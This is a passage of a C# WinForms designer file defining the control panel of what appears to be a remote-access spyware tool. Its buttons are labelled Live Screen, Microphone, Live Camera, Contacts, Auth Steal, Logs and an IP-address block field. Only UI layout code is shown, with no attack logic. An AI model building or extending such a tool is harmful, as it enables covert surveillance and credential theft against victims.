            this.guna2GradientButton4.HoverState.BorderColor = System.Drawing.Color.Red;
            this.guna2GradientButton4.HoverState.FillColor = System.Drawing.Color.Black;
            this.guna2GradientButton4.HoverState.FillColor2 = System.Drawing.Color.Black;
            this.guna2GradientButton4.HoverState.ForeColor = System.Drawing.Color.White;
            this.guna2GradientButton4.ImageAlign = System.Windows.Forms.HorizontalAlignment.Left;
            this.guna2GradientButton4.ImageSize = new System.Drawing.Size(25, 25);
            this.guna2GradientButton4.Location = new System.Drawing.Point(180, 52);
            this.guna2GradientButton4.Margin = new System.Windows.Forms.Padding(4);
            this.guna2GradientButton4.Name = "guna2GradientButton4";
            this.guna2GradientButton4.Size = new System.Drawing.Size(148, 55);
            this.guna2GradientButton4.TabIndex = 126;
            this.guna2GradientButton4.Text = "Support";
            this.guna2GradientButton4.TextAlign = System.Windows.Forms.HorizontalAlignment.Left;
            this.guna2GradientButton4.Click += new System.EventHandler(this.guna2GradientButton4_Click);
            // 
            // drakeUIMeter1
            // 
            this.drakeUIMeter1.BodyColor = System.Drawing.Color.Red;
            this.drakeUIMeter1.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F);
            this.drakeUIMeter1.Location = new System.Drawing.Point(189, 42);
            this.drakeUIMeter1.Margin = new System.Windows.Forms.Padding(4);
            this.drakeUIMeter1.MaxValue = 100D;
            this.drakeUIMeter1.MinValue = 0D;
            this.drakeUIMeter1.Name = "drakeUIMeter1";
            this.drakeUIMeter1.NeedleColor = System.Drawing.Color.Aqua;
            this.drakeUIMeter1.Renderer = null;
            this.drakeUIMeter1.Size = new System.Drawing.Size(124, 123);
            this.drakeUIMeter1.Style = DrakeUI.Framework.UIStyle.Custom;
            this.drakeUIMeter1.TabIndex = 75;
            this.drakeUIMeter1.Text = "drakeUIMeter1";
            this.drakeUIMeter1.Value = 0D;
            // 
            // AlertButton
            // 
            this.AlertButton.Cursor = System.Windows.Forms.Cursors.Hand;
            this.AlertButton.FillColor = System.Drawing.Color.Black;
            this.AlertButton.FillDisableColor = System.Drawing.Color.Black;
            this.AlertButton.FillHoverColor = System.Drawing.Color.Black;
            this.AlertButton.FillPressColor = System.Drawing.Color.Black;
            this.AlertButton.FillSelectedColor = System.Drawing.Color.Aqua;
            this.AlertButton.Font = new System.Drawing.Font("Bahnschrift", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.AlertButton.ForeColor = System.Drawing.Color.Aqua;
            this.AlertButton.ForeDisableColor = System.Drawing.Color.Aqua;
            this.AlertButton.ForeHoverColor = System.Drawing.Color.Aqua;
            this.AlertButton.ForePressColor = System.Drawing.Color.Aqua;
            this.AlertButton.ForeSelectedColor = System.Drawing.Color.Aqua;
            this.AlertButton.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.AlertButton.Location = new System.Drawing.Point(112, 64);
            this.AlertButton.Margin = new System.Windows.Forms.Padding(4);
            this.AlertButton.Name = "AlertButton";
            this.AlertButton.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
            this.AlertButton.RectColor = System.Drawing.Color.Black;
            this.AlertButton.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.AlertButton.RectHoverColor = System.Drawing.Color.White;
            this.AlertButton.RectPressColor = System.Drawing.Color.White;
            this.AlertButton.RectSelectedColor = System.Drawing.Color.White;
            this.AlertButton.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.Top;
            this.AlertButton.ShowFocusLine = true;
            this.AlertButton.Size = new System.Drawing.Size(163, 54);
            this.AlertButton.Style = DrakeUI.Framework.UIStyle.Custom;
            this.AlertButton.StyleCustomMode = true;
            this.AlertButton.Symbol = 57458;
            this.AlertButton.SymbolSize = 30;
            this.AlertButton.TabIndex = 145;
            this.AlertButton.Text = "Alert";
            this.AlertButton.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
            this.AlertButton.TipsText = "Home";
            // 
            // toblocktext
            // 
            this.toblocktext.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.toblocktext.FillColor = System.Drawing.Color.Black;
            this.toblocktext.Font = new System.Drawing.Font("Calibri", 12F);
            this.toblocktext.ForeColor = System.Drawing.Color.White;
            this.toblocktext.Location = new System.Drawing.Point(-99, 43);
            this.toblocktext.Margin = new System.Windows.Forms.Padding(5, 6, 5, 6);
            this.toblocktext.Maximum = 2147483647D;
            this.toblocktext.Minimum = -2147483648D;
            this.toblocktext.Name = "toblocktext";
            this.toblocktext.Padding = new System.Windows.Forms.Padding(7, 6, 7, 6);
            this.toblocktext.Radius = 10;
            this.toblocktext.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.toblocktext.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.toblocktext.Size = new System.Drawing.Size(140, 32);
            this.toblocktext.Style = DrakeUI.Framework.UIStyle.Custom;
            this.toblocktext.StyleCustomMode = true;
            this.toblocktext.TabIndex = 44;
            this.toblocktext.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
            this.toblocktext.Visible = false;
            this.toblocktext.Watermark = "IP Address";
            // 
            // ClientsLogs
            // 
            this.ClientsLogs.BorderRadius = 6;
            this.ClientsLogs.BorderThickness = 1;
            this.ClientsLogs.Cursor = System.Windows.Forms.Cursors.Hand;
            this.ClientsLogs.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.ClientsLogs.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.ClientsLogs.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.ClientsLogs.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.ClientsLogs.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.ClientsLogs.FillColor = System.Drawing.Color.Black;
            this.ClientsLogs.FillColor2 = System.Drawing.Color.Black;
            this.ClientsLogs.Font = new System.Drawing.Font("Candara", 12F, System.Drawing.FontStyle.Bold);
            this.ClientsLogs.ForeColor = System.Drawing.Color.Red;
            this.ClientsLogs.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.ForwardDiagonal;
            this.ClientsLogs.HoverState.BorderColor = System.Drawing.Color.Red;
            this.ClientsLogs.HoverState.FillColor = System.Drawing.Color.Black;
            this.ClientsLogs.HoverState.FillColor2 = System.Drawing.Color.Black;
            this.ClientsLogs.HoverState.ForeColor = System.Drawing.Color.White;
            this.ClientsLogs.ImageAlign = System.Windows.Forms.HorizontalAlignment.Left;
            this.ClientsLogs.ImageSize = new System.Drawing.Size(25, 25);
            this.ClientsLogs.Location = new System.Drawing.Point(121, 130);
            this.ClientsLogs.Margin = new System.Windows.Forms.Padding(4);
            this.ClientsLogs.Name = "ClientsLogs";
            this.ClientsLogs.Size = new System.Drawing.Size(169, 70);
            this.ClientsLogs.TabIndex = 124;
            this.ClientsLogs.Text = "Logs   ";
            this.ClientsLogs.Click += new System.EventHandler(this.ClientsLogs_Click);
            // 
            // guna2Panel4
            // 
            this.guna2Panel4.BorderColor = System.Drawing.Color.Red;
            this.guna2Panel4.BorderThickness = 2;
            this.guna2Panel4.Controls.Add(this.drakeUIButtonIcon26);
            this.guna2Panel4.Controls.Add(this.drakeUIButtonIcon1);
            this.guna2Panel4.Controls.Add(this.drakeUIButtonIcon2);
            this.guna2Panel4.Controls.Add(this.drakeUIButtonIcon12);
            this.guna2Panel4.Controls.Add(this.drakeUIButtonIcon13);
            this.guna2Panel4.Controls.Add(this.drakeUIButtonIcon21);
            this.guna2Panel4.Controls.Add(this.drakeUIButtonIcon18);
            this.guna2Panel4.Controls.Add(this.drakeUIButtonIcon27);
            this.guna2Panel4.Controls.Add(this.drakeUIButtonIcon25);
            this.guna2Panel4.Controls.Add(this.drakeUIButtonIcon24);
            this.guna2Panel4.Controls.Add(this.drakeUIButtonIcon23);
            this.guna2Panel4.Controls.Add(this.drakeUIButtonIcon22);
            this.guna2Panel4.Controls.Add(this.drakeUIButtonIcon33);
            this.guna2Panel4.Controls.Add(this.drakeUIButtonIcon17);
            this.guna2Panel4.Controls.Add(this.drakeUIButtonIcon31);
            this.guna2Panel4.Controls.Add(this.drakeUIButtonIcon30);
            this.guna2Panel4.Controls.Add(this.drakeUIButtonIcon29);
            this.guna2Panel4.Controls.Add(this.drakeUIButtonIcon28);
            this.guna2Panel4.Controls.Add(this.drakeUIButtonIcon4);
            this.guna2Panel4.Controls.Add(this.drakeUIButtonIcon15);
            this.guna2Panel4.Controls.Add(this.drakeUIButtonIcon34);
            this.guna2Panel4.Controls.Add(this.drakeUIButtonIcon35);
            this.guna2Panel4.Controls.Add(this.drakeUIButtonIcon36);
            this.guna2Panel4.Controls.Add(this.drakeUIButtonIcon37);
            this.guna2Panel4.Controls.Add(this.drakeUIButtonIcon38);
            this.guna2Panel4.Location = new System.Drawing.Point(2256, 300);
            this.guna2Panel4.Margin = new System.Windows.Forms.Padding(4);
            this.guna2Panel4.Name = "guna2Panel4";
            this.guna2Panel4.Size = new System.Drawing.Size(275, 416);
            this.guna2Panel4.TabIndex = 56;
            // 
            // drakeUIButtonIcon26
            // 
            this.drakeUIButtonIcon26.Cursor = System.Windows.Forms.Cursors.Hand;
            this.drakeUIButtonIcon26.FillColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon26.FillDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon26.FillHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon26.FillPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon26.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon26.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F);
            this.drakeUIButtonIcon26.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon26.ForeDisableColor = System.Drawing.Color.Red;
            this.drakeUIButtonIcon26.ForeHoverColor = System.Drawing.Color.Blue;
            this.drakeUIButtonIcon26.ForePressColor = System.Drawing.Color.Lime;
            this.drakeUIButtonIcon26.ForeSelectedColor = System.Drawing.Color.Lime;
            this.drakeUIButtonIcon26.ImageAlign = System.Drawing.ContentAlignment.TopCenter;
            this.drakeUIButtonIcon26.Location = new System.Drawing.Point(233, 268);
            this.drakeUIButtonIcon26.Margin = new System.Windows.Forms.Padding(4);
            this.drakeUIButtonIcon26.Name = "drakeUIButtonIcon26";
            this.drakeUIButtonIcon26.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
            this.drakeUIButtonIcon26.RectColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon26.RectDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon26.RectHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon26.RectPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon26.RectSelectedColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon26.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
            this.drakeUIButtonIcon26.Size = new System.Drawing.Size(83, 53);
            this.drakeUIButtonIcon26.Style = DrakeUI.Framework.UIStyle.Custom;
            this.drakeUIButtonIcon26.Symbol = 62137;
            this.drakeUIButtonIcon26.SymbolSize = 30;
            this.drakeUIButtonIcon26.TabIndex = 57;
            this.drakeUIButtonIcon26.Text = "Contacts";
            this.drakeUIButtonIcon26.TextAlign = System.Drawing.ContentAlignment.BottomCenter;
            this.drakeUIButtonIcon26.TipsFont = new System.Drawing.Font("Bahnschrift", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.drakeUIButtonIcon26.Click += new System.EventHandler(this.drakeUIButtonIcon26_Click);
            // 
            // drakeUIButtonIcon1
            // 
            this.drakeUIButtonIcon1.Cursor = System.Windows.Forms.Cursors.Hand;
            this.drakeUIButtonIcon1.FillColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon1.FillDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon1.FillHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon1.FillPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon1.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon1.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F);
            this.drakeUIButtonIcon1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon1.ForeDisableColor = System.Drawing.Color.Red;
            this.drakeUIButtonIcon1.ForeHoverColor = System.Drawing.Color.Blue;
            this.drakeUIButtonIcon1.ForePressColor = System.Drawing.Color.Lime;
            this.drakeUIButtonIcon1.ForeSelectedColor = System.Drawing.Color.Lime;
            this.drakeUIButtonIcon1.ImageAlign = System.Drawing.ContentAlignment.TopCenter;
            this.drakeUIButtonIcon1.Location = new System.Drawing.Point(-104, 54);
            this.drakeUIButtonIcon1.Margin = new System.Windows.Forms.Padding(4);
            this.drakeUIButtonIcon1.Name = "drakeUIButtonIcon1";
            this.drakeUIButtonIcon1.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
            this.drakeUIButtonIcon1.RectColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon1.RectDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon1.RectHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon1.RectPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon1.RectSelectedColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon1.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
            this.drakeUIButtonIcon1.Size = new System.Drawing.Size(103, 53);
            this.drakeUIButtonIcon1.Style = DrakeUI.Framework.UIStyle.Custom;
            this.drakeUIButtonIcon1.Symbol = 61706;
            this.drakeUIButtonIcon1.SymbolSize = 30;
            this.drakeUIButtonIcon1.TabIndex = 51;
            this.drakeUIButtonIcon1.Text = "Live Screen";
            this.drakeUIButtonIcon1.TextAlign = System.Drawing.ContentAlignment.BottomCenter;
            this.drakeUIButtonIcon1.TipsFont = new System.Drawing.Font("Bahnschrift", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.drakeUIButtonIcon1.Click += new System.EventHandler(this.drakeUIButtonIcon1_Click_2);
            // 
            // drakeUIButtonIcon2
            // 
            this.drakeUIButtonIcon2.Cursor = System.Windows.Forms.Cursors.Hand;
            this.drakeUIButtonIcon2.FillColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon2.FillDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon2.FillHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon2.FillPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon2.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon2.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F);
            this.drakeUIButtonIcon2.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon2.ForeDisableColor = System.Drawing.Color.Red;
            this.drakeUIButtonIcon2.ForeHoverColor = System.Drawing.Color.Blue;
            this.drakeUIButtonIcon2.ForePressColor = System.Drawing.Color.Lime;
            this.drakeUIButtonIcon2.ForeSelectedColor = System.Drawing.Color.Lime;
            this.drakeUIButtonIcon2.ImageAlign = System.Drawing.ContentAlignment.TopCenter;
            this.drakeUIButtonIcon2.Location = new System.Drawing.Point(9, 123);
            this.drakeUIButtonIcon2.Margin = new System.Windows.Forms.Padding(4);
            this.drakeUIButtonIcon2.Name = "drakeUIButtonIcon2";
            this.drakeUIButtonIcon2.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
            this.drakeUIButtonIcon2.RectColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon2.RectDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon2.RectHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon2.RectPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon2.RectSelectedColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon2.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
            this.drakeUIButtonIcon2.Size = new System.Drawing.Size(100, 53);
            this.drakeUIButtonIcon2.Style = DrakeUI.Framework.UIStyle.Custom;
            this.drakeUIButtonIcon2.Symbol = 61744;
            this.drakeUIButtonIcon2.SymbolSize = 30;
            this.drakeUIButtonIcon2.TabIndex = 52;
            this.drakeUIButtonIcon2.Text = "Microphone";
            this.drakeUIButtonIcon2.TextAlign = System.Drawing.ContentAlignment.BottomCenter;
            this.drakeUIButtonIcon2.Click += new System.EventHandler(this.drakeUIButtonIcon2_Click_1);
            // 
            // drakeUIButtonIcon12
            // 
            this.drakeUIButtonIcon12.Cursor = System.Windows.Forms.Cursors.Hand;
            this.drakeUIButtonIcon12.FillColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon12.FillDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon12.FillHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon12.FillPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon12.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon12.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F);
            this.drakeUIButtonIcon12.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon12.ForeDisableColor = System.Drawing.Color.Red;
            this.drakeUIButtonIcon12.ForeHoverColor = System.Drawing.Color.Blue;
            this.drakeUIButtonIcon12.ForePressColor = System.Drawing.Color.Lime;
            this.drakeUIButtonIcon12.ForeSelectedColor = System.Drawing.Color.Lime;
            this.drakeUIButtonIcon12.ImageAlign = System.Drawing.ContentAlignment.TopCenter;
            this.drakeUIButtonIcon12.Location = new System.Drawing.Point(-3, 54);
            this.drakeUIButtonIcon12.Margin = new System.Windows.Forms.Padding(4);
            this.drakeUIButtonIcon12.Name = "drakeUIButtonIcon12";
            this.drakeUIButtonIcon12.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
            this.drakeUIButtonIcon12.RectColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon12.RectDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon12.RectHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon12.RectPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon12.RectSelectedColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon12.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
            this.drakeUIButtonIcon12.Size = new System.Drawing.Size(121, 53);
            this.drakeUIButtonIcon12.Style = DrakeUI.Framework.UIStyle.Custom;
            this.drakeUIButtonIcon12.Symbol = 61501;
            this.drakeUIButtonIcon12.SymbolSize = 30;
            this.drakeUIButtonIcon12.TabIndex = 53;
            this.drakeUIButtonIcon12.Text = "Live Camera";
            this.drakeUIButtonIcon12.TextAlign = System.Drawing.ContentAlignment.BottomCenter;
            this.drakeUIButtonIcon12.Click += new System.EventHandler(this.drakeUIButtonIcon12_Click_1);
            // 
            // drakeUIButtonIcon13
            // 
            this.drakeUIButtonIcon13.Cursor = System.Windows.Forms.Cursors.Hand;
            this.drakeUIButtonIcon13.FillColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon13.FillDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon13.FillHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon13.FillPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon13.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon13.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F);
            this.drakeUIButtonIcon13.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon13.ForeDisableColor = System.Drawing.Color.Red;
            this.drakeUIButtonIcon13.ForeHoverColor = System.Drawing.Color.Blue;
            this.drakeUIButtonIcon13.ForePressColor = System.Drawing.Color.Lime;
            this.drakeUIButtonIcon13.ForeSelectedColor = System.Drawing.Color.Lime;
            this.drakeUIButtonIcon13.ImageAlign = System.Drawing.ContentAlignment.TopCenter;
            this.drakeUIButtonIcon13.Location = new System.Drawing.Point(339, 54);
            this.drakeUIButtonIcon13.Margin = new System.Windows.Forms.Padding(4);
            this.drakeUIButtonIcon13.Name = "drakeUIButtonIcon13";
            this.drakeUIButtonIcon13.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
            this.drakeUIButtonIcon13.RectColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon13.RectDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon13.RectHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon13.RectPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon13.RectSelectedColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon13.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
            this.drakeUIButtonIcon13.Size = new System.Drawing.Size(71, 53);
            this.drakeUIButtonIcon13.Style = DrakeUI.Framework.UIStyle.Custom;
            this.drakeUIButtonIcon13.Symbol = 61687;
            this.drakeUIButtonIcon13.SymbolSize = 30;
            this.drakeUIButtonIcon13.TabIndex = 54;
            this.drakeUIButtonIcon13.Text = "Reader";
            this.drakeUIButtonIcon13.TextAlign = System.Drawing.ContentAlignment.BottomCenter;
            this.drakeUIButtonIcon13.TipsFont = new System.Drawing.Font("Bahnschrift", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.drakeUIButtonIcon13.Click += new System.EventHandler(this.drakeUIButtonIcon13_Click_1);
            // 
            // drakeUIButtonIcon21
            // 
            this.drakeUIButtonIcon21.Cursor = System.Windows.Forms.Cursors.Hand;
            this.drakeUIButtonIcon21.FillColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon21.FillDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon21.FillHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon21.FillPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon21.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon21.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F);
            this.drakeUIButtonIcon21.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon21.ForeDisableColor = System.Drawing.Color.Red;
            this.drakeUIButtonIcon21.ForeHoverColor = System.Drawing.Color.Blue;
            this.drakeUIButtonIcon21.ForePressColor = System.Drawing.Color.Lime;
            this.drakeUIButtonIcon21.ForeSelectedColor = System.Drawing.Color.Lime;
            this.drakeUIButtonIcon21.ImageAlign = System.Drawing.ContentAlignment.TopCenter;
            this.drakeUIButtonIcon21.Location = new System.Drawing.Point(-101, 267);
            this.drakeUIButtonIcon21.Margin = new System.Windows.Forms.Padding(4);
            this.drakeUIButtonIcon21.Name = "drakeUIButtonIcon21";
            this.drakeUIButtonIcon21.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
            this.drakeUIButtonIcon21.RectColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon21.RectDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon21.RectHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon21.RectPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon21.RectSelectedColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon21.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
            this.drakeUIButtonIcon21.Size = new System.Drawing.Size(83, 53);
            this.drakeUIButtonIcon21.Style = DrakeUI.Framework.UIStyle.Custom;
            this.drakeUIButtonIcon21.Symbol = 57447;
            this.drakeUIButtonIcon21.SymbolSize = 30;
            this.drakeUIButtonIcon21.TabIndex = 55;
            this.drakeUIButtonIcon21.Text = "Volume 0";
            this.drakeUIButtonIcon21.TextAlign = System.Drawing.ContentAlignment.BottomCenter;
            this.drakeUIButtonIcon21.Click += new System.EventHandler(this.drakeUIButtonIcon21_Click);
            // 
            // drakeUIButtonIcon18
            // 
            this.drakeUIButtonIcon18.Cursor = System.Windows.Forms.Cursors.Hand;
            this.drakeUIButtonIcon18.FillColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon18.FillDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon18.FillHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon18.FillPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon18.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon18.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F);
            this.drakeUIButtonIcon18.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon18.ForeDisableColor = System.Drawing.Color.Red;
            this.drakeUIButtonIcon18.ForeHoverColor = System.Drawing.Color.Blue;
            this.drakeUIButtonIcon18.ForePressColor = System.Drawing.Color.Lime;
            this.drakeUIButtonIcon18.ForeSelectedColor = System.Drawing.Color.Lime;
            this.drakeUIButtonIcon18.ImageAlign = System.Drawing.ContentAlignment.TopCenter;
            this.drakeUIButtonIcon18.Location = new System.Drawing.Point(224, 350);
            this.drakeUIButtonIcon18.Margin = new System.Windows.Forms.Padding(4);
            this.drakeUIButtonIcon18.Name = "drakeUIButtonIcon18";
            this.drakeUIButtonIcon18.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
            this.drakeUIButtonIcon18.RectColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon18.RectDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon18.RectHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon18.RectPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon18.RectSelectedColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon18.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
            this.drakeUIButtonIcon18.Size = new System.Drawing.Size(85, 53);
            this.drakeUIButtonIcon18.Style = DrakeUI.Framework.UIStyle.Custom;
            this.drakeUIButtonIcon18.Symbol = 61856;
            this.drakeUIButtonIcon18.SymbolSize = 30;
            this.drakeUIButtonIcon18.TabIndex = 82;
            this.drakeUIButtonIcon18.Text = "Auth Steal";
            this.drakeUIButtonIcon18.TextAlign = System.Drawing.ContentAlignment.BottomCenter;
            this.drakeUIButtonIcon18.TipsFont = new System.Drawing.Font("Bahnschrift", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.drakeUIButtonIcon18.Click += new System.EventHandler(this.drakeUIButtonIcon18_Click_1);
            // 
            // drakeUIButtonIcon27
            // 
            this.drakeUIButtonIcon27.Cursor = System.Windows.Forms.Cursors.Hand;
            this.drakeUIButtonIcon27.FillColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon27.FillDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon27.FillHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon27.FillPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon27.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon27.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F);
            this.drakeUIButtonIcon27.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon27.ForeDisableColor = System.Drawing.Color.Red;
            this.drakeUIButtonIcon27.ForeHoverColor = System.Drawing.Color.Blue;
            this.drakeUIButtonIcon27.ForePressColor = System.Drawing.Color.Lime;
            this.drakeUIButtonIcon27.ForeSelectedColor = System.Drawing.Color.Lime;
            this.drakeUIButtonIcon27.ImageAlign = System.Drawing.ContentAlignment.TopCenter;
            this.drakeUIButtonIcon27.Location = new System.Drawing.Point(99, 196);
            this.drakeUIButtonIcon27.Margin = new System.Windows.Forms.Padding(4);
            this.drakeUIButtonIcon27.Name = "drakeUIButtonIcon27";
            this.drakeUIButtonIcon27.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
